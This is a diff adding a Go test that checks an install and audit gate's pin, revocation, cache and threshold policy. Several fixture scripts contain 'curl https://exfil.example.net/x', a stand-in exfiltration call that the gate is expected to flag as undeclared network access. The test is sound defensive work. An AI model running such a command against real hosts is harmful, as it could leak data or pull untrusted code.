@@ -213,6 +213,98 @@ func TestRequirePinForOldSchemas(t *testing.T) {
 	}
 }
 
+// Gate is the production entry used by install (including global install) and
+// the audit CLI; GateReadOnly is the corresponding dry-run entry.
+func TestGatePinPolicyFreshAndCached(t *testing.T) {
+	cases := []struct {
+		name, mode, failOn, script, want string
+		schema                           int
+		pinned, revoked                  bool
+	}{
+		{"strict schema3 at threshold", "strict", "high", "curl https://exfil.example.net/x\n", DecisionBlock, 3, true, false},
+		{"strict schema4 above threshold", "strict", "medium", "curl https://exfil.example.net/x\n", DecisionBlock, 4, true, false},
+		{"strict schema2 with finding", "strict", "high", "curl https://exfil.example.net/x\n", DecisionBlock, 2, true, false},
+		{"strict schema1 clean pinned", "strict", "high", "echo ok\n", DecisionAllow, 1, true, false},
+		{"strict schema2 clean pinned", "strict", "high", "echo ok\n", DecisionAllow, 2, true, false},
+		{"strict schema2 clean unpinned", "strict", "high", "echo ok\n", DecisionRequirePin, 2, false, false},
+		{"strict revoked pin", "strict", "high", "echo ok\n", DecisionBlock, 3, true, true},
+		{"advisory revoked pin", "advisory", "high", "echo ok\n", DecisionBlock, 2, true, true},
+		{"advisory schema3 pinned finding", "advisory", "high", "curl https://exfil.example.net/x\n", DecisionWarn, 3, true, false},
+		{"advisory schema2 pinned finding", "advisory", "high", "curl https://exfil.example.net/x\n", DecisionWarn, 2, true, false},
+		{"advisory unpinned finding", "advisory", "high", "curl https://exfil.example.net/x\n", DecisionWarn, 3, false, false},
+		{"strict pinned below threshold", "strict", "critical", "curl https://exfil.example.net/x\n", DecisionWarn, 3, true, false},
+		{"strict pinned fail_on off", "strict", "off", "curl https://exfil.example.net/x\n", DecisionWarn, 3, true, false},
+	}
+	for _, entry := range []struct {
+		name string
+		gate func(*config.Config, []Subject) ([]string, []string)
+	}{
+		{"Gate", Gate},
+		{"GateReadOnly", GateReadOnly},
+	} {
+		for _, cached := range []bool{false, true} {
+			path := "fresh"
+			if cached {
+				path = "cached"
+			}
+			for _, tc := range cases {
+				t.Run(entry.name+"/"+path+"/"+tc.name, func(t *testing.T) {
+					cfg := newCfg(t, tc.mode, tc.failOn)
+					subject := subjectWith(t, tc.script, capabilities.ImplicitNone(), tc.schema)
+					contentHash, err := hashing.ContentSHA256(subject.Snapshot, nil)
+					if err != nil {
+						t.Fatal(err)
+					}
+					if cached {
+						// Populate through production, before pinning/revoking. The
+						// target policy must be recomputed from cached findings.
+						warm := *cfg
+						warm.Audit.Mode = "advisory"
+						_, errs := Gate(&warm, []Subject{subject})
+						if len(errs) != 0 {
+							t.Fatalf("warm cache: %v", errs)
+						}
+					}
+					if _, hit := loadCachedFindings(cfg, contentHash); hit != cached {
+						t.Fatalf("cache hit before gate = %v, want %v", hit, cached)
+					}
+					if tc.pinned {
+						if _, err := Pin(cfg.Home(), contentHash, "reviewed manually", "tester"); err != nil {
+							t.Fatal(err)
+						}
+					}
+					if tc.revoked {
+						cfg.Audit.Revocations = []string{contentHash}
+					}
+					warnings, errs := entry.gate(cfg, []Subject{subject})
+					switch tc.want {
+					case DecisionBlock:
+						evidence := "audit.capability.network-undeclared"
+						if tc.revoked {
+							evidence = "revoked"
+						}
+						if len(warnings) != 0 || len(errs) != 1 || !strings.Contains(errs[0], "audit blocked:") || !strings.Contains(errs[0], evidence) {
+							t.Fatalf("want block (%s): warnings=%v errs=%v", evidence, warnings, errs)
+						}
+					case DecisionRequirePin:
+						if len(warnings) != 0 || len(errs) != 1 || !strings.Contains(errs[0], "audit requires pin:") {
+							t.Fatalf("want require_pin: warnings=%v errs=%v", warnings, errs)
+						}
+					case DecisionWarn:
+						if len(errs) != 0 || len(warnings) != 1 || !strings.Contains(warnings[0], "audit warning:") || !strings.Contains(warnings[0], "audit.capability.network-undeclared") {
+							t.Fatalf("want warn: warnings=%v errs=%v", warnings, errs)
+						}
+					case DecisionAllow:
+						if len(warnings) != 0 || len(errs) != 0 {
+							t.Fatalf("want allow: warnings=%v errs=%v", warnings, errs)
+						}
+					}
+				})
+			}
+		}
+	}
+}
+
 func TestLocalRevocations(t *testing.T) {
 	subject := subjectWith(t, "echo ok\n", capabilities.ImplicitNone(), 3)
 	contentHash, _ := hashing.ContentSHA256(subject.Snapshot, nil)
